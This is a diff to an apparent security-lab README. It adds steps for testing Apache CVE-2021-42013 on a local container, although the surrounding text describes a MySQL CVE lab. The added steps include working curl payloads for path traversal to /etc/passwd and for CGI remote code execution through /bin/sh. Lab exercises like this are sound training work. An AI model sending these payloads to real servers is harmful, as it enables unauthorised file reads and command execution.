@@ -117,6 +117,37 @@ You've reproduced a simulated MySQL RCE vulnerability by combining insecure serv
 
 This lab was developed for educational and training purposes only to simulate CVE-2025-21497.
 
+✅ Next Steps to Test the Lab:
+🔎 1. Verify Apache Server is Running
+
+In a browser or with curl, check if the Apache server is up:
+
+curl http://localhost:8080
+
+You should see some default page or Apache test content. If you see a response, the server is reachable.
+🔥 2. Test the CVE-2021-42013 Exploit
+
+This vulnerability is a path traversal and remote code execution flaw in Apache 2.4.49 (and 2.4.50 when misconfigured).
+
+Run a curl command like this to test for path traversal:
+
+curl --path-as-is "http://localhost:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+
+If the server is vulnerable, it will return the contents of /etc/passwd.
+💻 3. Test for Remote Code Execution (RCE) (optional but powerful)
+
+If CGI is enabled and Apache is misconfigured, you can try RCE:
+
+curl --path-as-is -d 'echo; id' "http://localhost:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
+
+Or use a more direct payload like:
+
+curl --path-as-is -d 'echo; cat /etc/passwd' http://localhost:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh
+
+🛠️ 4. Remediation Testing
+
+Once you've confirmed the exploit works, test that it no longer works after applying the fix (like upgrading Apache or disabling CGI).
+
 Always practice responsible disclosure. Never publish malicious packages to public repositories or deploy insecure configurations in production environments.
 
 
